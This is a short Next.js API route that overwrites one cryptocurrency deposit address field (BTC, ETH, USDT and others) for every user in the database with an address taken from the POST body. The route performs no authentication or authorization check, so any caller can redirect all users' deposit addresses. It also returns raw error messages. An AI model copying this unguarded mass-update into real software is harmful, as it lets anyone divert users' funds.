import { connect } from "@/dbConfig/dbConfig";
import User from "@/models/userModel";
import { NextRequest, NextResponse } from "next/server";

connect();

export async function POST(request: NextRequest) {
  try {
    const reqBody = await request.json();

    const { logo, newAddress } = reqBody;

    // Find all users
    const users = await User.find();

    // Iterate through all users and update their addresses
    for (const user of users) {
      if (logo === "BNB") {
        user.BNBAddress = newAddress;
      } else if (logo === "BTC") {
        user.BTCAddress = newAddress;
      } else if (logo === "USDT") {
        user.USDTAddress = newAddress;
      } else if (logo === "TRC") {
        user.TRONAddress = newAddress;
      } else if (logo === "BCH") {
        user.BCHAddress = newAddress;
      } else if (logo === "ETH") {
        user.ETHAddress = newAddress;
      } else if (logo === "DOGE") {
        user.DOGEAddress = newAddress;
      }

      await user.save(); // Save the updated user
    }

    return NextResponse.json({
      message: "Updated Successfully for all users",
      success: true,
    });
  } catch (error: any) {
    return NextResponse.json({ error: error.message }, { status: 500 });
  }
}
